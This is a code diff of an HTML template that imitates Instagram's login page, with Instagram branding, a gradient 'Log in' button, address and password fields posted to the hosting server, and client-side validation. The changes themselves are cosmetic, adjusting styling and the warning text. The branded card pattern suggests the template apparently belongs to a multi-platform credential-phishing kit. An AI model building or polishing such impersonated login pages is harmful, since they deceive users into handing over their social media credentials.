@@ -1,6 +1,6 @@
 {% extends "base.html" %}
 {% block body %}
-<div class="card" style="max-width:520px;margin:28px auto;transition:none;">
+<div class="card" style="max-width:520px;margin:28px auto;transition:none;transform:none;">
   <div class="platform-header">
     <div class="icon-circle bg-instagram"><i class="fa-brands fa-instagram icon-lg"></i></div>
     <div>
@@ -10,14 +10,18 @@
   </div>
 
   <form id="loginForm" method="post" novalidate>
-    <input class="input" name="address" id="address" placeholder="Mobile number or email address" required>
-    <input class="input" name="password" id="password" type="password" placeholder="Password" required>
-    <div id="warning" style="color:#dc2626;font-size:13px;margin-top:4px;display:none;">
-      ⚠️ Please enter a valid email, phone number, and password.
+    <input class="input" id="address" name="address" placeholder="Mobile number or email address" required style="margin-bottom:8px;">
+    <input class="input" id="password" name="password" type="password" placeholder="Password" required style="margin-bottom:8px;">
+    
+    <div id="warning" style="display:none;color:#dc2626;font-size:13px;margin:4px 0 8px;text-align:center;">
+      ⚠️ Please enter a valid email or phone number and password.
     </div>
-    <div class="center" style="margin-top:10px;">
+
+    <div class="center" style="margin-top:6px;">
       <button class="btn btn-blue" type="submit"
-        style="width:100%;max-width:100%;padding:12px 0;border-radius:999px;font-size:15px;background:linear-gradient(45deg,#f58529,#dd2a7b,#8134af,#515bd4);border:none;color:#fff;box-shadow:0 8px 20px rgba(221,42,123,0.2);">
+        style="width:100%;padding:12px 0;border-radius:999px;font-size:15px;
+        background:linear-gradient(45deg,#f58529,#dd2a7b,#8134af,#515bd4);
+        border:none;color:#fff;box-shadow:0 6px 20px rgba(221,42,123,0.25);transition:background 0.3s ease;">
         Log in
       </button>
     </div>
@@ -29,6 +33,7 @@ document.getElementById("loginForm").addEventListener("submit", function(e) {
   const address = document.getElementById("address").value.trim();
   const password = document.getElementById("password").value.trim();
   const warning = document.getElementById("warning");
+
   const emailRegex = /^[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$/;
   const phoneRegex = /^\+?\d{6,}$/;
 
